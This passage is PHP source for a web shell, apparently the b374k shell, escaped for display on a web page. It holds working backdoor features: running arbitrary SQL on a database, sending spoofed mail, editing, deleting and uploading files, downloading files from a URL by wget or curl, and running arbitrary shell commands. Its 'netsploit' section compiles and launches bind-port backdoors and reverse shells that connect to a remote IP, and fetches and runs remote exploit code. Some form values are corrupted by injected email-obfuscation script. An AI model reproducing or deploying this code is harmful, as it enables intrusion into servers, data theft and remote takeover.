                    $msg.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "&amp;table=" . $table . "\"&gt;$table&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
                }
                $msg.= "&lt;/table&gt;";
            } elseif (isset($_GET['table']) && (!isset($_GET['sqlquery']))) {
                $db = $_GET['db'];
                $table = $_GET['table'];
                $query = "SELECT * FROM " . $db . "." . $table . " LIMIT 0,100;";
                $msgq = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
                $columns = array();
                $msg = "&lt;table class=\"explore\" style=\"width:99%;\"&gt;";
                $hasil = @mysql_query("SHOW FIELDS FROM " . $db . "." . $table);
                while (list($column) = @mysql_fetch_row($hasil)) {
                    $msg.= "&lt;th&gt;$column&lt;/th&gt;";
                    $kolum = $column;
                }
                $msg.= "&lt;/tr&gt;";
                $hasil = @mysql_query("SELECT count(*) FROM " . $db . "." . $table);
                list($total) = mysql_fetch_row($hasil);
                if (isset($_GET['z'])) $page = (int)$_GET['z'];
                else $page = 1;
                $pagenum = 100;
                $totpage = ceil($total / $pagenum);
                $start = (($page - 1) * $pagenum);
                $hasil = @mysql_query("SELECT * FROM " . $db . "." . $table . " LIMIT " . $start . "," . $pagenum);
                while ($datas = @mysql_fetch_assoc($hasil)) {
                    $msg.= "&lt;tr&gt;";
                    foreach ($datas as $data) {
                        if (trim($data) == "") $data = "&nbsp;";
                        $msg.= "&lt;td&gt;$data&lt;/td&gt;";
                    }
                    $msg.= "&lt;/tr&gt;";
                }
                $msg.= "&lt;/table&gt;";
                $head = "&lt;div style=\"padding:10px 0 0 6px;\"&gt; &lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /&gt; Page &lt;select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\"&gt;";
                for ($i = 1;$i &lt;= $totpage;$i++) {
                    $head.= "&lt;option value=\"" . $i . "\"&gt;" . $i . "&lt;/option&gt;";
                    if ($i == $_GET['z']) $head.= "&lt;option value=\"" . $i . "\" selected=\"selected\"&gt;" . $i . "&lt;/option&gt;";
                }
                $head.= "&lt;/select&gt;&lt;noscript&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /&gt;&lt;/noscript&gt;&lt;/form&gt;&lt;/div&gt;";
                $msg = $msgq . $head . $msg;
            } elseif (isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")) {
                $db = $_GET['db'];
                $query = magicboom($_GET['sqlquery']);
                $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
                @mysql_select_db($db);
                $querys = explode(";", $query);
                foreach ($querys as $query) {
                    if (trim($query) != "") {
                        $hasil = mysql_query($query);
                        if ($hasil) {
                            $msg.= "&lt;p style=\"padding:0;margin:20px 6px 0 6px;\"&gt;" . $query . ";&nbsp;&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;[&lt;/span&gt; ok &lt;span class=\"gaya\"&gt;]&lt;/span&gt;&lt;/p&gt;";
                            $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;";
                            for ($i = 0;$i &lt; @mysql_num_fields($hasil);$i++) $msg.= "&lt;th&gt;" . htmlspecialchars(@mysql_field_name($hasil, $i)) . "&lt;/th&gt;";
                            $msg.= "&lt;/tr&gt;";
                            for ($i = 0;$i &lt; @mysql_num_rows($hasil);$i++) {
                                $rows = @mysql_fetch_array($hasil);
                                $msg.= "&lt;tr&gt;";
                                for ($j = 0;$j &lt; @mysql_num_fields($hasil);$j++) {
                                    if ($rows[$j] == "") $dataz = "&nbsp;";
                                    else $dataz = $rows[$j];
                                    $msg.= "&lt;td&gt;" . $dataz . "&lt;/td&gt;";
                                }
                                $msg.= "&lt;/tr&gt;";
                            }
                            $msg.= "&lt;/table&gt;";
                        } else $msg.= "&lt;p style=\"padding:0;margin:20px 6px 0 6px;\"&gt;" . $query . ";&nbsp;&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;[&lt;/span&gt; error &lt;span class=\"gaya\"&gt;]&lt;/span&gt;&lt;/p&gt;";
                    }
                }
            } else {
                $query = "SHOW PROCESSLIST;
SHOW VARIABLES;
SHOW STATUS;";
                $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
                $dbs = array();
                $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;&lt;th&gt;available databases&lt;/th&gt;&lt;/tr&gt;";
                $hasil = @mysql_list_dbs($con);
                while (list($db) = @mysql_fetch_row($hasil)) {
                    @array_push($dbs, $db);
                }
                @sort($dbs);
                foreach ($dbs as $db) {
                    $msg.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "\"&gt;$db&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
                }
                $msg.= "&lt;/table&gt;";
            }
            @mysql_close($con);
        } else $msg = "&lt;p style=\"text-align:center;\"&gt;cant connect to mysql server&lt;/p&gt;";
        echo $msg;
    } else { ?> &lt;form action="?" method="get"&gt; &lt;input type="hidden" name="y" value="<?php echo $pwd; ?>" /&gt; &lt;input type="hidden" name="x" value="mysql" /&gt; &lt;table class="tabnet" style="width:300px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Connect to mySQL server&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Host&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Username&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Password&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Port&lt;/td&gt;&lt;td&gt;&lt;input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" /&gt;&nbsp;&lt;input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
    }
} elseif (isset($_GET['x']) && ($_GET['x'] == 'mail')) {
    if (isset($_POST['mail_send'])) {
        $mail_to = $_POST['mail_to'];
        $mail_from = $_POST['mail_from'];
        $mail_subject = $_POST['mail_subject'];
        $mail_content = magicboom($_POST['mail_content']);
        if (@mail($mail_to, $mail_subject, $mail_content, "FROM:$mail_from")) {
            $msg = "email sent to $mail_to";
        } else $msg = "send email failed";
    } ?> &lt;form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td&gt; &lt;textarea class="output" name="mail_content" id="cmd" style="height:340px;"&gt;Hey there, please patch me ASAP ;-p&lt;/textarea&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&lt;input class="inputz" style="width:20%;" type="text" value="admin@somesome.com
/* &lt;![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]&gt; */
" name="mail_to" /&gt;&nbsp; mail to&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&lt;input class="inputz" style="width:20%;" type="text" value="b374k@fbi.gov
/* &lt;![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]&gt; */
" name="mail_from" /&gt;&nbsp; from&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&lt;input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" /&gt;&nbsp; subject&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&lt;input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?>&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'phpinfo')) {
    @ob_start();
    eval("phpinfo();");
    $buff = @ob_get_contents();
    @ob_end_clean();
    $awal = strpos($buff, "&lt;body&gt;") + 6;
    $akhir = strpos($buff, "&lt;/body&gt;");
    echo "&lt;div class=\"phpinfo\"&gt;" . substr($buff, $awal, $akhir - $awal) . "&lt;/div&gt;";
} elseif (isset($_GET['view']) && ($_GET['view'] != "")) {
    if (is_file($_GET['view'])) {
        if (!isset($file)) $file = magicboom($_GET['view']);
        if (!$win && $posix) {
            $name = @posix_getpwuid(@fileowner($file));
            $group = @posix_getgrgid(@filegroup($file));
            $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
        } else {
            $owner = $user;
        }
        $filn = basename($file);
        echo "&lt;table style=\"margin:6px 0 0 2px;line-height:20px;\"&gt; &lt;tr&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td&gt;&lt;span id=\"" . clearspace($filn) . "_link\"&gt;" . $file . "&lt;/span&gt; &lt;form action=\"?y=" . $pwd . "&amp;view=$file\" method=\"post\" id=\"" . clearspace($filn) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $filn . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $filn . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Size&lt;/td&gt;&lt;td&gt;" . ukuran($file) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Permission&lt;/td&gt;&lt;td&gt;" . get_perms($file) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Owner&lt;/td&gt;&lt;td&gt;" . $owner . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Create time&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @filectime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Last modified&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @filemtime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Last accessed&lt;/td&gt;&lt;td&gt;" . date("d-M-Y H:i", @fileatime($file)) . "&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Actions&lt;/td&gt;&lt;td&gt;&lt;a href=\"?y=$pwd&amp;edit=$file\"&gt;edit&lt;/a&gt; | &lt;a href=\"javascript:tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;delete=$file\"&gt;delete&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;dl=$file\"&gt;download&lt;/a&gt;&nbsp;(&lt;a href=\"?y=$pwd&amp;dlgzip=$file\"&gt;gzip&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;View&lt;/td&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "\"&gt;text&lt;/a&gt; | &lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\"&gt;code&lt;/a&gt; | &lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=image\"&gt;image&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; ";
        if (isset($_GET['type']) && ($_GET['type'] == 'image')) {
            echo "&lt;div style=\"text-align:center;margin:8px;\"&gt;&lt;img src=\"?y=" . $pwd . "&amp;img=" . $filn . "\"&gt;&lt;/div&gt;";
        } elseif (isset($_GET['type']) && ($_GET['type'] == 'code')) {
            echo "&lt;div class=\"viewfile\"&gt;";
            $file = wordwrap(@file_get_contents($file), "240", "
");
            @highlight_string($file);
            echo "&lt;/div&gt;";
        } else {
            echo "&lt;div class=\"viewfile\"&gt;";
            echo nl2br(htmlentities((@file_get_contents($file))));
            echo "&lt;/div&gt;";
        }
    } elseif (is_dir($_GET['view'])) {
        echo showdir($pwd, $prompt);
    }
} elseif (isset($_GET['edit']) && ($_GET['edit'] != "")) {
    if (isset($_POST['save'])) {
        $file = $_POST['saveas'];
        $content = magicboom($_POST['content']);
        if ($filez = @fopen($file, "w")) {
            $time = date("d-M-Y H:i", time());
            if (@fwrite($filez, $content)) $msg = "file saved &lt;span class=\"gaya\"&gt;@&lt;/span&gt; " . $time;
            else $msg = "failed to save";
            @fclose($filez);
        } else $msg = "permission denied";
    }
    if (!isset($file)) $file = $_GET['edit'];
    if ($filez = @fopen($file, "r")) {
        $content = "";
        while (!feof($filez)) {
            $content.= htmlentities(str_replace("''", "'", fgets($filez)));
        }
        @fclose($filez);
    } ?> &lt;form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" name="content"&gt; <?php echo $content; ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;Save as &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /&gt;&lt;input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /&gt; &nbsp;<?php echo $msg; ?>&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'upload')) {
    if (isset($_POST['uploadcomp'])) {
        if (is_uploaded_file($_FILES['file']['tmp_name'])) {
            $path = magicboom($_POST['path']);
            $fname = $_FILES['file']['name'];
            $tmp_name = $_FILES['file']['tmp_name'];
            $pindah = $path . $fname;
            $stat = @move_uploaded_file($tmp_name, $pindah);
            if ($stat) {
                $msg = "file uploaded to $pindah";
            } else $msg = "failed to upload $fname";
        } else $msg = "failed to upload $fname";
    } elseif (isset($_POST['uploadurl'])) {
        $pilihan = trim($_POST['pilihan']);
        $wurl = trim($_POST['wurl']);
        $path = magicboom($_POST['path']);
        $namafile = download($pilihan, $wurl);
        $pindah = $path . $namafile;
        if (is_file($pindah)) {
            $msg = "file uploaded to $pindah";
        } else $msg = "failed to upload $namafile";
    } ?> &lt;form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post"&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from computer&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;p style="text-align:center;"&gt;&lt;input style="color:#000000;" type="file" name="file" /&gt;&lt;input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"&gt;&lt;/p&gt;&lt;/td&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/form&gt; &lt;table class="tabnet" style="width:320px;padding:0 1px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Upload from url&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload"&gt; &lt;table&gt;&lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;<?php echo $msg; ?>&lt;/div&gt; <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'netsploit')) {
    if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
        $port = trim($_POST['port']);
        $passwrd = trim($_POST['bind_pass']);
        tulis("bdc.c", $port_bind_bd_c);
        exe("gcc -o bdc bdc.c");
        exe("chmod 777 bdc");
        @unlink("bdc.c");
        exe("./bdc " . $port . " " . $passwrd . " &");
        $scan = exe("ps aux");
        if (eregi("./bdc $por", $scan)) {
            $msg = "&lt;p&gt;Process found running, backdoor setup successfully.&lt;/p&gt;";
        } else {
            $msg = "&lt;p&gt;Process not found running, backdoor not setup successfully.&lt;/p&gt;";
        }
    } elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
        $port = trim($_POST['port']);
        $passwrd = trim($_POST['bind_pass']);
        tulis("bdp", $port_bind_bd_pl);
        exe("chmod 777 bdp");
        $p2 = which("perl");
        exe($p2 . " bdp " . $port . " &");
        $scan = exe("ps aux");
        if (eregi("$p2 bdp $port", $scan)) {
            $msg = "&lt;p&gt;Process found running, backdoor setup successfully.&lt;/p&gt;";
        } else {
            $msg = "&lt;p&gt;Process not found running, backdoor not setup successfully.&lt;/p&gt;";
        }
    } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
        $ip = trim($_POST['ip']);
        $port = trim($_POST['backport']);
        tulis("bcc.c", $back_connect_c);
        exe("gcc -o bcc bcc.c");
        exe("chmod 777 bcc");
        @unlink("bcc.c");
        exe("./bcc " . $ip . " " . $port . " &");
        $msg = "Now script try connect to " . $ip . " port " . $port . " ...";
    } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
        $ip = trim($_POST['ip']);
        $port = trim($_POST['backport']);
        tulis("bcp", $back_connect);
        exe("chmod +x bcp");
        $p2 = which("perl");
        exe($p2 . " bcp " . $ip . " " . $port . " &");
        $msg = "Now script try connect to " . $ip . " port " . $port . " ...";
    } elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {
        $pilihan = trim($_POST['pilihan']);
        $wurl = trim($_POST['wurl']);
        $namafile = download($pilihan, $wurl);
        if (is_file($namafile)) {
            $msg = exe($wcmd);
        } else $msg = "error: file not found $namafile";
    } ?> &lt;table class="tabnet"&gt; &lt;tr&gt;&lt;th&gt;Port Binding&lt;/th&gt;&lt;th&gt;Connect Back&lt;/th&gt;&lt;th&gt;Load and Exploit&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select class="inputz" size="1" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;IP&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select size="1" class="inputz" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;url&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;cmd&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;<?php echo $msg; ?>&lt;/div&gt; <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'shell')) { ?> &lt;form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" readonly&gt; <?php if (isset($_POST['submitcmd'])) {
        echo @exe($_POST['cmd']);
    } ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;<?php echo $prompt; ?>&lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /&gt;&lt;input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
} else {
    if (isset($_GET['delete']) && ($_GET['delete'] != "")) {
        $file = $_GET['delete'];
        @unlink($file);
    } elseif (isset($_GET['fdelete']) && ($_GET['fdelete'] != "")) {
        @rmdir(rtrim($_GET['fdelete'], DIRECTORY_SEPARATOR));
    } elseif (isset($_GET['mkdir']) && ($_GET['mkdir'] != "")) {
        $path = $pwd . $_GET['mkdir'];
        @mkdir($path);
    }
    $buff = showdir($pwd, $prompt);
    echo $buff;
} ?> &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;
{% endhighlight %}